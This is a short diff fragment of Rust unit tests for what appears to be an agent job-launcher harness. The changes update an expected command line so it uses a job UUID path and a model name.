+            Ok(format!("omp/{OMP_VERSION}"))
+        );
+        let _ = std::fs::remove_dir_all(&tmp);
     }
 
     #[test]
@@ -1001,11 +1460,11 @@ mod tests {
             OMP.json_invoke,
             Some("qwen3:14b"),
             "/opt/data/workbench/sessions/abc",
-            &job_launcher("abc"),
+            &job_launcher(JOB).unwrap(),
         );
         assert_eq!(
             out,
-            "/opt/data/workbench/harness/jobs/abc/omp --mode json --auto-approve --session-dir /opt/data/workbench/sessions/abc --model talaria/qwen3:14b \"<task>\""
+            "/opt/data/workbench/harness/jobs/11111111-2222-4333-8444-555555555555/omp --mode json --auto-approve --session-dir /opt/data/workbench/sessions/abc --model talaria/qwen3:14b \"<task>\""
         );
         assert!(
             out.contains("\"<task>\""),
